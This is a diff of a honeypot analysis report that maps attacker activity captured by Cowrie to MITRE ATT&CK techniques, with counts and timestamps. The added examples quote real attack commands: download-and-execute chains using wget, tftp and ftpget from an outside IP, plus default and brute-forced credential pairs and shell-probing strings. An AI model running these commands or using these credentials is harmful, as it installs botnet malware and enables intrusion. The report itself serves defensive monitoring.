@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-17 00:04:11",
+  "generated": "2026-08-17 01:01:11",
   "totals": {
-    "commands": 166,
-    "login_failed": 92,
-    "login_success": 56,
-    "sessions": 70
+    "commands": 1886,
+    "login_failed": 2007,
+    "login_success": 622,
+    "sessions": 1722
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 92,
+      "count": 2007,
       "examples": [
         "user / user",
         "root / juantech",
@@ -21,34 +21,142 @@
         "root / 54321"
       ],
       "first": "2026-08-17T00:00:02.095344Z",
-      "last": "2026-08-17T00:04:10.807966Z",
-      "unique_ips": 3
+      "last": "2026-08-17T01:01:04.369362Z",
+      "unique_ips": 16
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 56,
+      "count": 622,
       "examples": [
-        "enable\\x00 / linuxshell\\x00"
+        "enable\\x00 / linuxshell\\x00",
+        "admin / 7ujMko0admin",
+        "root / 123@@@",
+        "root / root",
+        "hikvision / hikvision"
       ],
       "first": "2026-08-17T00:00:02.486601Z",
-      "last": "2026-08-17T00:04:11.239583Z",
+      "last": "2026-08-17T01:01:03.714825Z",
+      "unique_ips": 9
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 15,
+      "examples": [
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
+        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
+        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/",
+        ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
+      ],
+      "first": "2026-08-17T00:12:41.686965Z",
+      "last": "2026-08-17T00:13:19.596196Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 4,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "http://185.93.89.72/wget",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
+      ],
+      "first": "2026-08-17T00:12:43.326791Z",
+      "last": "2026-08-17T00:13:19.596196Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "uname -s -v -n -r -m",
+        "uname -a"
+      ],
+      "first": "2026-08-17T00:25:26.685038Z",
+      "last": "2026-08-17T00:58:14.291065Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-08-17T00:12:43.326791Z",
+      "last": "2026-08-17T00:12:43.326791Z",
       "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "system",
-      56
+      616
     ],
     [
       "shell",
-      55
+      616
     ],
     [
       "sh",
-      55
+      616
+    ],
+    [
+      "/bin/busybox",
+      7
+    ],
+    [
+      "enable",
+      2
+    ],
+    [
+      "linuxshell",
+      2
+    ],
+    [
+      "/bin/busybox UNSTABLE",
+      1
+    ],
+    [
+      "enablelinuxshell",
+      1
+    ],
+    [
+      "ping ;sh",
+      1
+    ],
+    [
+      "busybox",
+      1
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      1
+    ],
+    [
+      "echo SHELL_TEST",
+      1
+    ],
+    [
+      "/bin/busybox TEST",
+      1
+    ],
+    [
+      "cat /proc",
+      1
+    ],
+    [
+      "./",
+      1
     ]
   ]
 }
